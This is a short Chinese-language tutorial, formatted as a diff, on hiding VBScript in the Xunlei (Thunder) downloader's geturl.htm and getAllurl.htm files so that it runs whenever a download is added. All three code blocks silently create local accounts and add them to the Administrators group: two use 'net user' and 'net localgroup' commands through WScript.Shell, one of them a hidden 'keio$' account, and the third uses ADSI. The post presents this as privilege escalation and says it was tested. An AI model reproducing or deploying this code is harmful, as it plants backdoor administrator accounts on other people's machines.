@@ -1,0 +1,36 @@
+当我们使用迅雷下载东西的时候，会调用我们安装迅雷后一个htm文件，去激活htm文件里的一些代码，
+把我们所下载东西添加到列表当中。 
+所对应的htm文件有2处一处是C:\Program Files \Thunder Network\Thunder\Program\geturl.htm 
+一处是C:\Program Files \Thunder Network\Thunder\Program\getAllurl.htm 
+如果我们想把我们想要的代码添加进去执行了？
+我们简单写个代码试试，代码如下：
+<script language="VBScript"> 
+Set vbs=CreateObject("Wscript.Shell")   
+vbs.run "cmd /c net user lucifer 123456 /add",0 ;
+vbs.run "cmd /c net localgroup administrators lucifer /add",0 
+</script> 
+应该大家都可以看的出，如果我们把这段代码添加到那2个htm文件里，当迅雷下载东西的时候，一样会去执行我们的代码。添加一个 administrators组的一个用户kindle 
+当然，代码大家可以自定义的
+　　测试通过，迅雷版本为5.9.2.927 
+
+
+
+在迅雷的安装目录找到  geturl.htm 文件中添加隐藏代码  实现提权
+
+set wsnetwork=CreateObject("WSCRIPT.NETWORK") 
+os="WinNT://"&wsnetwork.ComputerName 
+Set ob=GetObject(os)
+Set oe=GetObject(os&"/Administrators,group")
+Set od=ob.Create("user","join1")
+od.SetPassword "ABCabc!@#123"  
+od.SetInfo
+Set of=GetObject(os&"/join1",user)  
+oe.add os&"/join1" 
+
+
+下面的代码好像不行
+<script language="VBScript">
+Set vbs=CreateObject("Wscript.shell")
+vbs.run "cmd /c net user keio$ keio123 /add",0
+vbs.run "cmd /c net localgroup administrators keio$ /add",0
+</script>
